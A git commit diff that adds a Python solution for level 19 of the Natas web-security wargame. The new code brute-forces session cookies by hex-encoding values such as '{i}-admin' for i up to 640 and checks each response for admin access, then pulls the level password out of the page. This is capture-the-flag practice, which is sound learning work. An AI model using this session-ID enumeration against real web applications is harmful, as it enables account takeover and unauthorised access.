15c13c561b140d7e70cbc641e871b1bdc0e2b243
Evan Johnson <evanj2357@gmail.com>
2021-09-16 16:35:48 -0700

    solved by modifying natas18 solution

--- solutions/natas19.py
+++ solutions/natas19.py
@@ -1,4 +1,5 @@
 """
+natas18 with a twist, bring an ASCII table!
 """
 
 import requests
@@ -9,6 +10,18 @@ from natas_utils import *
 LEVEL = 19
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
+    for i in range(1, 641):
+        with requests.session() as session:
+            session.auth = login
+            # the IDs this time are hex-ified ASCII with the format {idNumber}-{username}
+            session.cookies.set("PHPSESSID", bytes(f"{i}-admin", "utf8").hex())
+            response = session.post(f"{url}/index.php?debug=1", data={"username": "admin", "password": "admin"})
+            response.raise_for_status()
+
+            if "You are an admin" in response.text:
+                candidates = extract_candidate_passwords(response.text)
+                if len(candidates) == 1:
+                    return candidates[0]
     return None
 
 if __name__ == "__main__":
